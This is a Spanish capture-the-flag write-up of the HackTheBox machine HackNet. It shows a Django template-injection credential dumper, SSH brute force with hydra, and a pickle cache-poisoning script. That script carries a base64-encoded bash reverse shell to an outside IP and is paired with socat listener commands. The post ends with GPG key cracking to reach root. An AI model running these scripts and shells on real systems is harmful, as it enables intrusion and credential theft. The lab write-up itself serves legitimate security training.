---
layout: post
title: HTB HackNet Rompiendo Django
date: 2025-12-26 
categories: [HTB]
---

![maquina](/assets/images/2025-12-26-htb-hacknet/hacknet.png)

**HackNet** es una máquina de dificultad media de la plataforma de **HackTheBox.**

Con esta máquina aprenderás a :

1.  Explotar SSTI en Django automatizado en Python
2.  Explotar _Insecure Deserialization_ en Pickle
3.  Usar claves GPG y crackeo de hashes con **john**

### **1. Reconocimiento Inicial**

Empiezo enviando una traza ICMP con **ping:**

![ping](/assets/images/2025-12-26-htb-hacknet/ping.png)

y escaneo los puertos abiertos con **nmap:**

![nmap](/assets/images/2025-12-26-htb-hacknet/nmap.png)

Una vez que conozco los puertos abiertos, puedo enumerar los servicios que corren en ellos:

![services](/assets/images/2025-12-26-htb-hacknet/services.png)

Como usa **http,** accedo a [**http://hacknet.htb**](http://hacknet.htb) y enumero los directorios y tecnologías del servicio web:

![wappalyzer](/assets/images/2025-12-26-htb-hacknet/wappalyzer.png)![gobuster](/assets/images/2025-12-26-htb-hacknet/gobuster.png)

Tras investigar las distintas funcionalidades de la página, se detecta una inyección de plantillas del lado del servidor en la funcionalidad de **likes**, provocada por el renderizado inseguro de contenido controlado por el usuario.

Si edito el perfil para que mi nombre de usuario sea **{{ 12345|add:12345 }}**, en la funcionalidad de **likes** se puede ver el número sumado.

![likes](/assets/images/2025-12-26-htb-hacknet/likes.png)

Este comportamiento demuestra que el nombre de usuario se evalúa como plantilla DTL (Django Template Language).

### 2. Explotando SSTI

Puesto que Django no permite ejecutar comandos, lo único que podemos probar es acceder a alguna variable que esté incluida directamente en el **contexto** que se pasa al template.

Después de probar varios nombres encuentro que **users** está disponible, y al establecer **{{ users.values }}** como nombre de usuario puedo ver toda la información de todos los usuarios que le han dado like al mismo _post_ que yo:

![dump](/assets/images/2025-12-26-htb-hacknet/dump.png)

Sabiendo esto, creo un script en python que va extrayendo el **id, email, username y password** de todos los usuarios que le han dado like a cada uno de los posts del blog.

Al finalizar genera unos diccionarios con la contraseña y el usuario o email del usuario para realizar ataques de fuerza bruta:

```python
from bs4 import BeautifulSoup
from termcolor import colored
from tabulate import tabulate
from tqdm import tqdm
import requests
import signal
import sys
import ast
import re
from typing import List, Dict, Optional
# ================= CONFIG =================
ROOT_URL = "http://hacknet.htb"
COOKIES = {
    "csrftoken": "INTRODUCIR CSRF TOKEN",
    "sessionid": "INTRODUCIR SESSION ID"
}
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest",
    "Referer": f"{ROOT_URL}/explore",
}
KEYS = {"id", "email", "username", "password"}
# ================= SIGNAL =================
def sigint_handler(sig, frame):
    print(colored("\n[!] Ctrl+C detectado, saliendo...\n", "red"))
    sys.exit(1)
signal.signal(signal.SIGINT, sigint_handler)
# ================= NETWORK =================
session = requests.Session()
session.headers.update(HEADERS)
session.cookies.update(COOKIES)
def get(url: str) -> str:
    return session.get(url, timeout=10).text
# ================= PARSING =================
def extract_users_from_html(html: str) -> Optional[List[Dict]]:
    soup = BeautifulSoup(html, "html.parser")
    imgs = soup.find_all("img")
    if not imgs or "title" not in imgs[-1].attrs:
        print(colored("[!] No se encontró el atributo title", "yellow"))
        return None
    # Obtener lista del atributo title
    title = imgs[-1]["title"]
    match = re.search(r"\[(.*)\]", title, re.DOTALL)
    if not match:
        return None
    data = "[" + match.group(1) + "]"
    users = ast.literal_eval(data)
    # eliminar truncado en caso de que haya demasiados valores
    if isinstance(users[-1], str) and "remaining elements truncated" in users[-1]:
        users.pop()
    # crear array
    return [        {k: u[k] for k in KEYS}
        for u in users
        if u.get("username") != "{{ users.values }}"
    ]
# ================= LOGIC =================
def get_users(post_id: int) -> Optional[List[Dict]]:
    likes_url = f"{ROOT_URL}/likes/{post_id}"
    html = get(likes_url)
    if "{{ users.values }}" not in html:
        session.get(f"{ROOT_URL}/like/{post_id}")
        html = get(likes_url)
    return extract_users_from_html(html)
# ================= OUTPUT =================
def write_wordlists(users: List[Dict]) -> None:
    print(colored("[+] Creando diccionarios...", "blue"))
    files = {
        "users.txt": [u["username"] for u in users],
        "emails.txt": [u["email"].split("@")[0] for u in users],
        "passwords.txt": [u["password"] for u in users],
    }
    for fname, values in files.items():
        with open(fname, "w") as f:
            f.write("\n".join(values) + "\n")
    print(colored("[+] Diccionarios creados", "green"))
# ================= MAIN =================
def main():
    print(colored("=== HACKNET USER DUMP ===\n", "blue"))
    users: List[Dict] = []
    seen = set()
    for post_id in tqdm(range(1, 27), desc="Obteniendo usuarios"):
        post_users = get_users(post_id) or []
        for u in post_users:
            if u["id"] not in seen:
                users.append(u)
                seen.add(u["id"])
    print(colored("[+] Usuarios obtenidos", "green"))
    print(tabulate(
        [[u["id"], u["username"], u["email"], u["password"]] for u in users],
        headers=["ID", "Usuario", "Email", "Contraseña"]
    ))
    write_wordlists(users)
if __name__ == "__main__":
    main()
```

Ahora, hago fuerza bruta con **hydra** al servicio **ssh** para ver si alguna de las credenciales es válida en el sistema:

![crack passwrod](/assets/images/2025-12-26-htb-hacknet/crack.png)

### Funcionamiento de la vulnerabilidad

Cada vez que realizamos una petición a un servidor Django, se sigue el siguiente flujo:

![esquema](/assets/images/2025-12-26-htb-hacknet/esquema.png)

Una vez la petición ha llegado al servidor, y a pasado por el **middleware**, el URL Resolver (en este caso en **HackNet/SocialNetwork/urls.py**) decide que vista (view) ejecutar para la URL que se está solicitando

![urls.py](/assets/images/2025-12-26-htb-hacknet/urls.png)

Cuando hacemos una petición a **/likes** para ver los usuarios que le han dado like al post, llama a la _view_ **likes** (**HackNet/SocialNetwork/views.py**):

![views.py](/assets/images/2025-12-26-htb-hacknet/views.png)

Es aquí, donde podemos observar que la variable **users** se encuentra dentro del contexto y que el valor de **{{ users.username }}** se concatena directamente dentro de una plantilla construida dinámicamentelo sin aplicar ningún tipo de validación.

### 3. Acceso Inicial y movimiento lateral

Con las credenciales del usuario **mikey** gano acceso al sistema.

Para enumerar, primero trato de averiguar donde se encuentra alojado el servicio web de **HackNet:**

![Archivos Hacknet](/assets/images/2025-12-26-htb-hacknet/files.png)

En **/var/www/HackNet** hay un archivo de configuración **settings.py** en el que aparece información sobre el caché de Django:

![DB config](/assets/images/2025-12-26-htb-hacknet/database.png)

Parece que el cache se almacena en el directorio **/var/tmp/django_cache**, sobre el cual tengo todos los permisos

![Permisos](/assets/images/2025-12-26-htb-hacknet/perms.png)

Según la [documentación](https://docs.djangoproject.com/en/6.0/topics/cache/), Django serializa objetos complejos en la cache usando **pickle**, lo que provoca la deserialización automática de cualquier archivo `.djcache` al acceder a la vista correspondiente.

![Django Documentation](/assets/images/2025-12-26-htb-hacknet/info.png)

Creo un script en **python**, que usa **pickle** para cargar un _payload_ malicioso en los archivos de caché. Este payload me enviará una _reverse shell_ con los privilegios del usuario que corre el servicio web (**sandy**):

```python
import pickle
import os
class Malicious:
    def __reduce__(self):
        # reverse shell:  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:PUERTO
        return (os.system, ("echo \"YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMjcvODA4MCAwPiYxJwo=\" | base64 -d | bash",),) 
        
CACHE_PATH = "/var/tmp/django_cache"
def swap_cache(payload):
    files = os.listdir(CACHE_PATH)
    for file in files:
        # Se sustituye el contenido de todos los archivos por el payload de reverse shell
        if file.endswith(".djcache"):
            file_path = CACHE_PATH + "/" + file
            try:
             os.remove(file_path)
         except:
          continue
            with open(file_path, "wb") as f:
                 f.write(payload)
                print(f"[+] Payload en {file}")
if __name__ == '__main__':
    payload = pickle.dumps(Malicious())
    swap_cache(payload)
    print("[+] Exitoso")
```

creo un listener con **socat:**

```
socat file:'tty',raw,echo=0 tcp-listen:PUERTO
```

ejecuto el script en la máquina víctima y realizo una petición a [**http://hacknet.htb/explore.**](http://hacknet.htb/explore.)

Así, recibo una consola interactiva como **sandy.**

### 4. Root

Para ganar acceso **root**, trato de desencriptar las bases de datos cifradas que vi anteriormente en busca de información relevante.

Como están cifradas con GPG, pruebo a buscar archivos **.asc**, que puedan contener una clave:

![Keys](/assets/images/2025-12-26-htb-hacknet/keys.png)

Afortunadamente, en el archivo armored_key.asc, hay una clave privada, que voy a crackear con **john**:

![Password Crack](/assets/images/2025-12-26-htb-hacknet/crack2.png)


Ahora, con esta contraseña desencripto las bases de datos

```shell
gpg --output <output name> --decrypt backup01.sql.gpg
```

En una de ellas, se encuentra la contraseña del usuario root:
![Contraseña root](/assets/images/2025-12-26-htb-hacknet/passdump.png)

